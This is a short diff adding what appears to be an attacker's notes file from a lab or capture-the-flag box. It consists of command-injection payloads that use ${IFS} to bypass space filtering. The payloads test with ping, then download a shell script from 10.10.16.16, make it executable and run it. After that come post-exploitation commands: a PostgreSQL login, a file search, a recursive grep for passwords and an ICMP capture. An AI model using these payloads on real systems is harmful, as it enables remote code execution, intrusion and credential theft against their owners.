@@ -1,0 +1,17 @@
+0xdf;ping${IFS}-c${IFS}1${IFS}127.0.0.1
+
+
+0xdf;ping${IFS}-c${IFS}1${IFS}10.10.16.16;#
+curl http://10.10.16.16/1.sh -o /tmp/1.sh
+
+123;curl${IFS}http://10.10.16.16/1.sh${IFS}-o${IFS}/tmp/1.sh;#
+123;chmod${IFS}700${IFS}/tmp/1.sh;#
+123;/tmp/1.sh;#
+
+psql -h localhost -p 5432 -U postgres -d POSTGRESQL
+
+find -L /tmp/ -type f -name "*prop*"
+
+grep -r password . /dev/null
+
+tcpdump -ni tun0 icmp
